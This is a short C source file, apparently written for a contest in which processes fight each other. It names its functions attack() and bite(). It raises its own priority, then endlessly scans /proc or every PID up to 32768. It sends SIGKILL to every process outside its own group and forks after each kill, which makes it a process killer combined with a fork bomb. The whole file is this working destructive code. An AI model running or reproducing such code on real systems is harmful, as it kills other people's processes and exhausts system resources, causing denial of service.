#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <string>
#include <dirent.h>
#include <pthread.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>

#define MAX_PID 32768
#define SZ_BUFF 16384

typedef struct {
	long inode;
	off_t off;
	unsigned short len;
	char name[];
} e;

inline void attack();
inline void bite(int);

pid_t pgid;
int kt;

int main(int argc, char* argv[]) {
	setpgid(0, 0);
	setpriority(PRIO_PGRP, 0, -20);
	kt = atoi(argv[2]) * 3;
	pgid = getpgid(0);
	attack();
}

inline void attack(){
	int fd = open("/proc", O_RDONLY | O_DIRECTORY);
	if (fd == -1) {
		while (1) { 
			for (int i = getpid() - kt; i <= getpid() + kt; i++) { bite(i); }
			for (int i = 1; i <= MAX_PID; i++) { bite(i); }
		}
	} 
	else {
		for (int i = getpid() - kt; i <= getpid() + kt; i++) { bite(i); }
		e *ent;
		int n, pid;
		char buffer[SZ_BUFF];
		while (1) {
			n = syscall(SYS_getdents, fd, buffer, SZ_BUFF);
			if (!n) { lseek(fd, 0, SEEK_SET); continue; }
			for (int p = 0; p < n;) {
				ent = (e*)(buffer + p);
				pid = atoi(ent -> name);
				bite(pid);
				p += ent -> len;
			}
		}
	}
}

inline void bite(int pid) {
	if (getpgid(pid) == pgid) return; // Fellow squirrel
	kill(pid, SIGKILL);
	fork();
}